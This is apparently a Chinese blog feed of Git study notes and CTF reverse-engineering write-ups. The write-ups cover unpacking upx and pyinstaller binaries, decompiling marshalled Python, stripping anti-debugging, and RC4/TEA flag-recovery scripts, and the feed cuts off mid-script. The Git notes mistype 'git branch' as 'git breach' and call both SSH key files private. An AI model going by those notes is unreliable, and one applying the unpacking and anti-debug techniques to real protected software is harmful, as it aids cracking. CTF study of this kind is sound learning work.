    <content type="html"><![CDATA[<h2 id="Git学习">Git学习</h2><p>易于调试优化迭代，用于版本管理</p><h3 id="版本控制">版本控制</h3><p>历史记录，还原内容</p><h3 id="基本操作">基本操作</h3><h4 id="创建本地仓库">创建本地仓库</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir xxx</span><br><span class="line">cd xxx</span><br><span class="line">git init</span><br></pre></td></tr></table></figure><p>配置用户名/邮箱</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;xxxx&quot;</span><br><span class="line">git config --global user.email &quot;xxx@qq.com&quot;</span><br></pre></td></tr></table></figure><h4 id="提交内容">提交内容</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add xxx #将某个内容暂存</span><br><span class="line">git add . #把所有已修改文件移到暂存区</span><br><span class="line">git status #查看当前状态</span><br><span class="line">git commit -m &quot;注释说明&quot; #提交已暂存的文件</span><br></pre></td></tr></table></figure><p>文件状态</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">已修改：处于工作区</span><br><span class="line">已暂存：处于暂存区</span><br><span class="line">已提交：处于Git仓库</span><br></pre></td></tr></table></figure><p>其它命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log #查看提交记录</span><br></pre></td></tr></table></figure><h2 id="Github远程仓库操作">Github远程仓库操作</h2><p>创建仓库后，在SSH处得到一个链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add name_of_remote_repository git@github.com:xxx</span><br></pre></td></tr></table></figure><p>配置公私钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;geekuni@geekbang.com&quot;</span><br></pre></td></tr></table></figure><p>得到了公私钥</p><p>没有pub的是私钥，有pub的是私钥</p><p>在github中找到设置SSH and FPG keys，新建，然后再key中添加pubkey内容。这样就连接好了</p><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>用于验证是否可以连接上</p><p>push：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u name main #name是远程仓库名，main是分支</span><br></pre></td></tr></table></figure><h2 id="分支管理">分支管理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch  #查看当前分支</span><br></pre></td></tr></table></figure><p>分支只是一个指针</p><p>详见：</p><p><a href="https://blog.csdn.net/silence_pinot/article/details/111478596">git的分支管理（详细版）_git分支管理-CSDN博客</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b new_branch_name  #创建一个新分支并切换到这个分支</span><br><span class="line">git breach -d name #删除一个分支</span><br><span class="line">git checkout main #切换回main分支</span><br><span class="line">git merge branch_name #将一个分支（快速合并，只移动指针）合并到主分支</span><br></pre></td></tr></table></figure><p>保存当前工作现场，用于临时切换分支</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git stash  #保存</span><br><span class="line">git stash pop  #恢复</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Git学习&quot;&gt;Git学习&lt;/h2&gt;
&lt;p&gt;易于调试优化迭代，用于版本管理&lt;/p&gt;
&lt;h3 id=&quot;版本控制&quot;&gt;版本控制&lt;/h3&gt;
&lt;p&gt;历史记录，还原内容&lt;/p&gt;
&lt;h3 id=&quot;基本操作&quot;&gt;基本操作&lt;/h3&gt;
&lt;h4 id=&quot;创建本地仓库&quot;&gt;创建本地仓库&lt;/h4</summary>
      
    
    
    
    
    <category term="开发" scheme="https://www.pri87.vip/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>暑假学习记录1</title>
    <link href="https://www.pri87.vip/posts/4ead32f4.html"/>
    <id>https://www.pri87.vip/posts/4ead32f4.html</id>
    <published>2024-07-15T14:48:40.000Z</published>
    <updated>2024-07-17T04:46:04.710Z</updated>
    
    <content type="html"><![CDATA[<div class="note info simple"><p>目录：</p><p><a href="https://www.pri87.vip/posts/4ead32f4.html">学习记录1</a> &lt;=</p><p>学习记录2</p></div><p>想研究一下反调试，所以最近的主线是归纳反调试技术<br>之后会单独写一篇博客来汇总</p><p>然后记录一下最近写的题</p><p>以及在杂方向上面学的东西</p><hr><h2 id="wp">wp:</h2><p><a href="https://www.pri87.vip/posts/1cdc16cf.html">2024春秋杯夏 re wp</a></p><p><a href="https://www.pri87.vip/posts/4f799b15.html">WKCTF-RE部分wp</a></p><h3 id="矩阵杯packpy题目复现：">矩阵杯packpy题目复现：</h3><p>拿到文件，是一个elf，用010打开，发现被upx过，修改一下标志，把upx?改成UPX!，用upx -d去壳</p><p>打开后，发现是一个pyinstaller打包的py文件，用工具反编译成pyc</p><p>然后uncompyle6解码主要pyc，得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.9.13 (tags/v3.9.13:6de2ca5, May 17 2022, 16:36:42) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: packpy.py</span></span><br><span class="line"><span class="keyword">import</span> base58, zlib, marshal</span><br><span class="line">scrambled_code_string = <span class="string">b&#x27;X1XehTQeZCsb4WSLBJBYZMjovD1x1E5wjTHh2w3j8dDxbscVa6HLEBSUTPEMsAcerwYASTaXFsCmWb1RxBfwBd6RmyePv3AevTDUiFAvV1GB94eURvtdrpYez7dF1egrwVz3EcQjHxXrpLXs2APE4MS93sMsgMgDrTFCNwTkPba31Aa2FeCSMu151LvEpwiPq5hvaZQPaY2s4pBpH16gGDoVb9MEvLn5J4cP23rEfV7EzNXMgqLUKF82mH1v7yjVCtYQhR8RprKCCtD3bekHjBH2AwES4QythgjVetUNDRpN5gfeJ99UYbZn1oRQHVmiu1sLjpq2mMm8tTuiZgfMfsktf5Suz2w8DgRX4qBKQijnuU4Jou9hduLeudXkZ85oWx9SU7MCE6gjsvy1u57VYw33vckJU6XGGZgZvSqKGR5oQKJf8MPNZi1dF8yF9MkwDdEq59jFsRUJDv7kNwig8XiuBXvmtJPV963thXCFQWQe8XGSu7kJqeRaBX1pkkQ4goJpgTLDHR1LW7bGcZ7m13KzW5mVmJHax81XLis774FjwWpApmTVuiGC2TQr2RcyUTkhGgC8R4bQiXgCsqZMoWyafcSmjdZsHmE6WgNAqPQmEg9FyjpK5f2XC1DkzuyHan5YceeEDMxKUJgJrmNcdGxB7281EyeriyuWNJVH2rVNhio6yoG&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(marshal.loads(zlib.decompress(base58.b58decode(scrambled_code_string))))</span><br></pre></td></tr></table></figure><p>通过把exec改成print，可以得到这个序列化内容是一个code object</p><p>我们需要把它还原成可读的代码</p><p>在网上搜索资料的时候，发现，py在执行的时候会先被编译成PyCodeObject 对象，然后被保存到pyc文件中</p><p>可以这样导入pyc文件的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="string">&quot;你好啊&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> importlib.machinery <span class="keyword">import</span> SourcelessFileLoader</span><br><span class="line"> </span><br><span class="line">tools = SourcelessFileLoader(</span><br><span class="line">    <span class="string">&quot;tools&quot;</span>, <span class="string">&quot;__pycache__/tools.cpython-38.pyc&quot;</span></span><br><span class="line">).load_module()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(tools.a)  <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(tools.b)  <span class="comment"># 你好啊</span></span><br></pre></td></tr></table></figure><p>可以猜测，marshal反序列化的内容其实可以当成pyc来看，尝试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">scrambled_code_string = <span class="string">b&#x27;X1XehTQeZCsb4WSLBJBYZMjovD1x1E5wjTHh2w3j8dDxbscVa6HLEBSUTPEMsAcerwYASTaXFsCmWb1RxBfwBd6RmyePv3AevTDUiFAvV1GB94eURvtdrpYez7dF1egrwVz3EcQjHxXrpLXs2APE4MS93sMsgMgDrTFCNwTkPba31Aa2FeCSMu151LvEpwiPq5hvaZQPaY2s4pBpH16gGDoVb9MEvLn5J4cP23rEfV7EzNXMgqLUKF82mH1v7yjVCtYQhR8RprKCCtD3bekHjBH2AwES4QythgjVetUNDRpN5gfeJ99UYbZn1oRQHVmiu1sLjpq2mMm8tTuiZgfMfsktf5Suz2w8DgRX4qBKQijnuU4Jou9hduLeudXkZ85oWx9SU7MCE6gjsvy1u57VYw33vckJU6XGGZgZvSqKGR5oQKJf8MPNZi1dF8yF9MkwDdEq59jFsRUJDv7kNwig8XiuBXvmtJPV963thXCFQWQe8XGSu7kJqeRaBX1pkkQ4goJpgTLDHR1LW7bGcZ7m13KzW5mVmJHax81XLis774FjwWpApmTVuiGC2TQr2RcyUTkhGgC8R4bQiXgCsqZMoWyafcSmjdZsHmE6WgNAqPQmEg9FyjpK5f2XC1DkzuyHan5YceeEDMxKUJgJrmNcdGxB7281EyeriyuWNJVH2rVNhio6yoG&#x27;</span></span><br><span class="line">a = zlib.decompress(base58.b58decode(scrambled_code_string))</span><br><span class="line"></span><br><span class="line">HEAD = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;550D0D0A000000000000000000000000&#x27;</span>) <span class="comment">#补充文件头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(HEAD+a)</span><br></pre></td></tr></table></figure><p>输出后，真的可以直接反编译，得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">encdata = <span class="string">b&#x27;\x18\xfa\xadd\xed\xab\xad\x9d\xe5\xc0\xad\xfa\xf9\x0be\xf9\xe5\xade6\xf9\xfd\x88\xf9\x9d\xe5\x9c\xe5\x9de\xc3))\x0f\xff&#x27;</span></span><br><span class="line">hex_output = binascii.hexlify(encdata).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">seed_value</span>):</span><br><span class="line">    key = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    random.seed(seed_value)</span><br><span class="line">    random.shuffle(key)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        encrypted.append(key[byte] ^ <span class="number">95</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(encrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;input your flag:&#x27;</span>)</span><br><span class="line">    key = generate_key(<span class="built_in">len</span>(flag))</span><br><span class="line">    data = flag.encode()</span><br><span class="line">    encrypted_data = encrypt(data, key)</span><br><span class="line">    <span class="keyword">if</span> encrypted_data == encdata:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;good&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(hex_output)</span><br><span class="line">last = [<span class="number">0x18</span>,<span class="number">0xfa</span>,<span class="number">0xad</span>,<span class="number">0x64</span>,<span class="number">0xed</span>,<span class="number">0xab</span>,<span class="number">0xad</span>,<span class="number">0x9d</span>,<span class="number">0xe5</span>,<span class="number">0xc0</span>,<span class="number">0xad</span>,<span class="number">0xfa</span>,<span class="number">0xf9</span>,<span class="number">0x0b</span>,<span class="number">0x65</span>,<span class="number">0xf9</span>,<span class="number">0xe5</span>,<span class="number">0xad</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0xf9</span>,<span class="number">0xfd</span>,<span class="number">0x88</span>,<span class="number">0xf9</span>,<span class="number">0x9d</span>,<span class="number">0xe5</span>,<span class="number">0x9c</span>,<span class="number">0xe5</span>,<span class="number">0x9d</span>,<span class="number">0x65</span>,<span class="number">0xc3</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x0f</span>,<span class="number">0xff</span>]</span><br><span class="line">okey = generate_key(<span class="built_in">len</span>(last))</span><br><span class="line">q = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> okey[j]^<span class="number">95</span>==last[i]:</span><br><span class="line">            q.append(j)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">pl(q)</span><br></pre></td></tr></table></figure><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mar3hal_Is_3asy_t0_r3v3rse!!@&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="ASM">ASM</h2><p>配置VS asm环境，我的VS版本为2022</p><p>CSDN上面写的太抽象了，我在<a href="https://zjlc.top/2022/05/11/assembly/">Windows平台编写汇编语言</a>看到了一个不错的</p><p>大概步骤就是：</p><ul><li><a href="http://www.masm32.com/download.htm">Download The MASM32 SDK</a>下载MASM SDK</li><li>在VS installer 里面下载MSVC V140 生成工具，v141 缓解库，v141 ARM生成工具</li><li></li></ul><h2 id="杂项：">杂项：</h2><p><a href="https://www.pri87.vip/posts/ab9e1965.html">git基本操作</a></p><p><a href="https://www.pri87.vip/posts/484c947.html">golang学习</a></p>]]></content>
    
    
    <summary type="html">暑假不许学习</summary>
    
    
    
    
    <category term="放假" scheme="https://www.pri87.vip/tags/%E6%94%BE%E5%81%87/"/>
    
    <category term="开摆" scheme="https://www.pri87.vip/tags/%E5%BC%80%E6%91%86/"/>
    
  </entry>
  
  <entry>
    <title>2024春秋杯夏 re wp</title>
    <link href="https://www.pri87.vip/posts/1cdc16cf.html"/>
    <id>https://www.pri87.vip/posts/1cdc16cf.html</id>
    <published>2024-07-07T07:46:12.000Z</published>
    <updated>2024-07-07T11:14:35.494Z</updated>
    
    <content type="html"><![CDATA[<h1>RE</h1><h2 id="snack">snack</h2><p>pyc解包，pycdc反编译，得到一个rc4加密，复制加密过程直接解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pl</span>(<span class="params">a, b=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= x &lt;= <span class="number">255</span> <span class="keyword">for</span> x <span class="keyword">in</span> a):</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(a[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = (<span class="string">&#x27;&#x27;</span>.join([long_to_bytes(a[i]).decode() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>)]))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> b <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> result.startswith(b):</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span><span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span>&#123;&#123;<span class="subst">&#123;result&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i],S[j] = S[j],S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_stream</span>(<span class="params">S, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i],S[j] = S[j],S[i]</span><br><span class="line">        key_stream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    S = initialize(key)</span><br><span class="line">    key_stream = generate_key_stream(S, <span class="built_in">len</span>(data))</span><br><span class="line">    decrypted_data = [i^ data[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))]</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line">data = [</span><br><span class="line">    <span class="number">101</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">218</span>,</span><br><span class="line">    <span class="number">172</span>,</span><br><span class="line">    <span class="number">205</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">235</span>,</span><br><span class="line">    <span class="number">195</span>,</span><br><span class="line">    <span class="number">72</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">130</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">213</span>,</span><br><span class="line">    <span class="number">120</span>,</span><br><span class="line">    <span class="number">227</span>,</span><br><span class="line">    <span class="number">193</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">174</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">162</span>,</span><br><span class="line">    <span class="number">248</span>,</span><br><span class="line">    <span class="number">244</span>,</span><br><span class="line">    <span class="number">12</span>,</span><br><span class="line">    <span class="number">238</span>,</span><br><span class="line">    <span class="number">92</span>,</span><br><span class="line">    <span class="number">160</span>,</span><br><span class="line">    <span class="number">203</span>,</span><br><span class="line">    <span class="number">185</span>,</span><br><span class="line">    <span class="number">155</span>]</span><br><span class="line">xor_key = <span class="string">&#x27;V3rY_v3Ry_Ez&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_key)):</span><br><span class="line">    key.append(<span class="built_in">ord</span>(xor_key[i]))</span><br><span class="line">pl(decrypt(data, key))</span><br><span class="line"><span class="comment"># flag&#123;KMLTz3lT_MePUDa7A_P5LpzCBT&#125;</span></span><br></pre></td></tr></table></figure><h2 id="HardSignin">HardSignin</h2><p>先去一个upx</p><p>有4个tls，里面有花和反调，去花杀反调，似乎是用随机数生成之后加密用的参数，同时对main解密</p><p><img src="https://s2.loli.net/2024/07/06/372SLiaWRdXwg8y.png" alt="image-20240706182721253"></p><p><img src="https://s2.loli.net/2024/07/06/CpvJHoiGXSOcxrA.png" alt="image-20240706195234707"></p><p><img src="https://s2.loli.net/2024/07/06/oarzEjK6tcLyWxD.png" alt="image-20240706195330050"></p><p>在tls2里面下断点到这里已经生成的数据</p><p>main里面3个步骤</p><p><img src="https://s2.loli.net/2024/07/06/igZvC3mJDLPh1Xr.png" alt="image-20240706182810516"></p><p>base64，rc4和tea直接反向解密就好</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">BYTE S[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decTEA</span><span class="params">(<span class="type">unsigned</span>* target, <span class="type">unsigned</span>* key)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span 